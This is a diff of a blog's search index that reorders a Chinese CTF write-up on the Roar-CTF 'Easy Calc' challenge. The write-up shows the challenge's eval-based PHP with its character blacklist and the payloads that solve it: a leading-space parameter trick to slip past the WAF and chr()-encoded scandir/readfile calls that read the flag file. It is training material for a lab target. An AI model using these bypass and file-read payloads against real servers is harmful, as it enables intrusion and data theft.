@@ -1,6 +1,46 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Buuoj WP(Web方向-1)</title>
+    <url>/2021/11/22/Buuoj-Web-Wp-1/</url>
+    <content><![CDATA[<h2 id="1、Roar-CTF-Easy-Calc"><a href="#1、Roar-CTF-Easy-Calc" class="headerlink" title="1、Roar-CTF Easy Calc"></a>1、Roar-CTF Easy Calc</h2><p>这题打开界面是一个计算表达式的网页</p>
+<p>首先，检查前端代码，发现前端向后端 calc.php 发送数据部署了WAF</p>
+<span id="more"></span>
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),</span></span><br><span class="line"><span class="javascript">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;/div&gt;`</span>);</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;这啥?算不来!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>打开calc.php，发现PHP代码如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>首先发送一个phpinfo()测试，发现返送回来一个403，看来是只能发送数字</p>
+<h3 id="PHP请求参数解析漏洞"><a href="#PHP请求参数解析漏洞" class="headerlink" title="PHP请求参数解析漏洞"></a>PHP请求参数解析漏洞</h3><p>利用PHP的请求参数解析漏洞</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//node4.buuoj.cn:28838/calc.php?num=phpinfo()</span></span><br><span class="line">http:<span class="comment">//node4.buuoj.cn:28838/calc.php? num=phpinfo()</span></span><br></pre></td></tr></table></figure>
+
+<p>当发送这两个变量时，都会在PHP内部解析为“num”变量（PHP解析时自动忽略前置空格）</p>
+<p>因此我们利用这招绕过了url上的数字检查，达到PHP内部实现RCE</p>
+<p>ban了这么多东西不要紧，我们还是可以利用PHP的内部函数来绕过</p>
+<p>（PHP的原生函数在RCE受限的情况下还是非常有用的，用起来也需要一定的熟练度和脑洞）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">num=var_dump(readfile(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到flag</p>
+<h3 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h3><p>我们当然也可以尝试使用HTTP请求走私的方法去绕过url的检查</p>
+<p>参考wp:<a href="https://www.jianshu.com/p/d58a280ff753">https://www.jianshu.com/p/d58a280ff753</a></p>
+<p>HTTP请求走私：<a href="https://xz.aliyun.com/t/6654#toc-1%5D">https://xz.aliyun.com/t/6654#toc-1%5D</a></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>wp</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>buuoj</tag>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow-xss-wp</title>
     <url>/2021/11/23/ctfshow-xss-wp/</url>
     <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
@@ -26,50 +66,10 @@
       </categories>
       <tags>
         <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>wp</tag>
         <tag>ctfshow</tag>
-        <tag>web</tag>
         <tag>xss</tag>
-        <tag>wp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Buuoj WP(Web方向-1)</title>
-    <url>/2021/11/22/Buuoj-Web-Wp-1/</url>
-    <content><![CDATA[<h2 id="1、Roar-CTF-Easy-Calc"><a href="#1、Roar-CTF-Easy-Calc" class="headerlink" title="1、Roar-CTF Easy Calc"></a>1、Roar-CTF Easy Calc</h2><p>这题打开界面是一个计算表达式的网页</p>
-<p>首先，检查前端代码，发现前端向后端 calc.php 发送数据部署了WAF</p>
-<span id="more"></span>
-
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),</span></span><br><span class="line"><span class="javascript">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;/div&gt;`</span>);</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;这啥?算不来!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>打开calc.php，发现PHP代码如下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>首先发送一个phpinfo()测试，发现返送回来一个403，看来是只能发送数字</p>
-<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>利用PHP的变量解析漏洞</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//node4.buuoj.cn:28838/calc.php?num=phpinfo()</span></span><br><span class="line">http:<span class="comment">//node4.buuoj.cn:28838/calc.php? num=phpinfo()</span></span><br></pre></td></tr></table></figure>
-
-<p>当发送这两个变量时，都会在PHP内部解析为“num”变量（PHP解析时自动忽略前置空格）</p>
-<p>因此我们利用这招绕过了url上的数字检查，达到PHP内部实现RCE</p>
-<p>ban了这么多东西不要紧，我们还是可以利用PHP的内部函数来绕过</p>
-<p>（PHP的原生函数在RCE受限的情况下还是非常有用的，用起来也需要一定的熟练度和脑洞）</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">num=var_dump(readfile(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>
-
-<p>成功拿到flag</p>
-<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>我们当然也可以尝试使用HTTP请求走私的方法去绕过url的检查</p>
-<p>参考wp:<a href="https://www.jianshu.com/p/d58a280ff753">https://www.jianshu.com/p/d58a280ff753</a></p>
-<p>HTTP请求走私：<a href="https://xz.aliyun.com/t/6654#toc-1%5D">https://xz.aliyun.com/t/6654#toc-1%5D</a></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>wp</category>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>wp</tag>
-        <tag>buuoj</tag>
       </tags>
   </entry>
   <entry>
